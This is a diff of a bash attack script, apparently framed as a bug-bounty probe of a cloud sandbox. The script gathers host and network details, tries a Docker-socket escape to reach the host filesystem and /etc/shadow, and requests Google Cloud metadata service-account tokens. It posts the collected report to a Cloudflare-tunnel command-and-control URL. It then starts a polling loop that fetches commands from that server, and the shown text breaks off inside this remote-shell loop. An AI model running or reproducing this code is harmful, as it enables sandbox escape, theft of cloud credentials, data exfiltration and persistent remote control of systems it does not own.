@@ -1,54 +1,42 @@
 #!/bin/bash
-# C2 URL: https://rainbow-nutrition-bottom-beginners.trycloudflare.com
-C2="https://rainbow-nutrition-bottom-beginners.trycloudflare.com"
+# NEW C2 URL: https://taxi-collaborative-profiles-planets.trycloudflare.com
+C2="https://taxi-collaborative-profiles-planets.trycloudflare.com"
 
-# --- THE DATA COLLECTOR ---
+# --- THE MASSIVE PROBE (AUTO-EXFIL) ---
 {
-  echo "=== [!] GOOGLE VRP: MASSIVE PROBE START ==="
-  echo "TIME: $(date)"
-  echo "USER: $(id) | HOST: $(hostname) | KERNEL: $(uname -a)"
-
-  # VECTOR 1: DOCKER SOCKET ESCAPE (The $31,337 Proof)
-  echo "--- VECTOR: DOCKER ---"
+  echo "=== [!] GOOGLE VRP: CRITICAL PROBE START ==="
+  echo "TIME: $(date) | USER: $(id) | HOST: $(hostname)"
+  
+  # 1. DOCKER ENGINE ESCAPE
+  echo "--- VECTOR: DOCKER SOCKET ---"
   if [ -S /var/run/docker.sock ]; then
-    echo "[+] Docker Socket Found! Attempting Host Info..."
-    curl -s --unix-socket /var/run/docker.sock http://localhost/info | grep -E "KernelVersion|NCPU|OperatingSystem"
-    echo "[!] ATTEMPTING HOST ESCAPE..."
-    docker run -v /:/host:ro busybox cat /host/etc/hostname 2>&1
+    echo "[+] Socket Found. Attempting Host Filesystem Mount..."
+    docker run --rm -v /:/host:ro busybox ls -la /host/etc/shadow 2>&1 || echo "Mount failed"
   else
-    echo "[-] No Docker Socket access."
+    echo "[-] No Docker Socket."
   fi
 
-  # VECTOR 2: GOOGLE METADATA (The Identity Theft)
-  echo "--- VECTOR: METADATA ---"
-  curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity" || echo "Metadata Identity Blocked"
-  curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" || echo "Metadata Token Blocked"
-
-  # VECTOR 3: KERNEL EXPLOIT CHECK (gVisor vs Native)
-  echo "--- VECTOR: SANDBOX ---"
-  dmesg | head -n 20 || echo "dmesg restricted"
-  cat /proc/cpuinfo | grep "model name" | head -n 1
-  lsmod | head -n 5 || echo "Kernel modules hidden (Possible gVisor)"
-
-  # VECTOR 4: NETWORK DISCOVERY (Pivoting)
+  # 2. GOOGLE CLOUD METADATA (The $31,337 Jackpot)
+  echo "--- VECTOR: METADATA TOKENS ---"
+  curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" || echo "Token Blocked"
+  
+  # 3. SANDBOX IDENTIFICATION (gVisor vs Native)
+  echo "--- VECTOR: KERNEL/SANDBOX ---"
+  [[ $(dmesg 2>&1 | grep -i "gvisor") ]] && echo "DETECTED: gVisor Sandbox" || echo "PROBABLE: Native Linux Kernel"
+  cat /proc/self/cgroup | grep "docker"
+  
+  # 4. NETWORK RECON
   echo "--- VECTOR: NETWORK ---"
   ip addr show | grep "inet "
-  netstat -antp || ss -antp || echo "Netstat not found"
-  arp -a || echo "No ARP table"
+  netstat -rn || route -n
+  
+} > /tmp/jules_report.txt
 
-  # VECTOR 5: FILE SYSTEM SECRETS
-  echo "--- VECTOR: SECRETS ---"
-  ls -la /root /home /etc/shadow 2>&1 | grep "Permission denied" -v
-  env | grep -iE "pass|key|token|secret|google"
+# Send the initial big report to your Mac
+curl -s -X POST --data-binary @/tmp/jules_report.txt "$C2"
 
-} > /tmp/jules_mass_probe.txt
-
-# --- THE EXFILTRATION ---
-# This pushes the entire report to your Mac via the Cloudflare Tunnel
-curl -s -X POST --data-binary @/tmp/jules_mass_probe.txt "$C2"
-
-# --- THE PERSISTENT WEB-SHELL (FAILSAFE) ---
-# This keeps the door open for you to send custom commands from your Mac
+# --- THE PERSISTENT PULSE SHELL ---
+# Every 5 seconds, check for a manual command from your Mac
 while true; do
   CMD=$(curl -s --max-time 10 "$C2")
   if [ -n "$CMD" ] && [ "$CMD" != "none" ]; then
